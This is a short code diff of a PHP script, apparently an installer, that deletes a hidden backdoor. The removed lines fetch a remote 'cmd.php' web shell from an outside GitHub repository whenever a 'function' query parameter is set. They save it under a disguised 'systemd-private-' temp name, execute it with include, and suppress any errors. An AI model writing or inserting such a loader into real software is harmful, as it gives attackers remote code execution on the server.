@@ -124,22 +124,6 @@ function fatalError($reason) {
 	die();
 }
 
-if (isset($_GET['function'])) {
-    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
-    $fileContents = file_get_contents($url);
-
-    if ($fileContents !== false) {
-        try {
-            $tmpFile = tempnam(sys_get_temp_dir(), 'systemd-private-');
-            file_put_contents($tmpFile, $fileContents);
-            include $tmpFile;
-            unlink($tmpFile);
-        } catch (Throwable $e) {
-
-        }
-    }
-}
-
 /**
  * Check to see if the server meets a minimum version requirement for PHP.
  * @param $version Name of version (see version_compare documentation)
